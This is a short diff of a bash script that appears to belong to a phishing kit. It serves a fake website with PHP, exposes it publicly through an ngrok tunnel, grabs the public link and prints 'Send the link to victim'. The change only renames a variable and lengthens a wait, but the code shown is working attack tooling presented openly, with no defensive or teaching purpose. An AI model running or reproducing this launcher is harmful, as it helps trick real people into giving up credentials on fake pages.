@@ -320,12 +320,13 @@ printf "\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;92m Launching Ngrok ..\e[0m\n"
 cd websites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
 sleep 2
 ./ngrok http 5555 > /dev/null 2>&1 &
-sleep 7
+sleep 10
 
-ngrok_link=$(curl -s -N http://127.0.0.1:4041/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-printf "\n\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $ngrok_link
+link=$(curl -s -N http://127.0.0.1:4041/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+printf "\n\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $link
 found
 }
+
 start_local(){
 def_port="5555"
 printf "\e[0m\n"
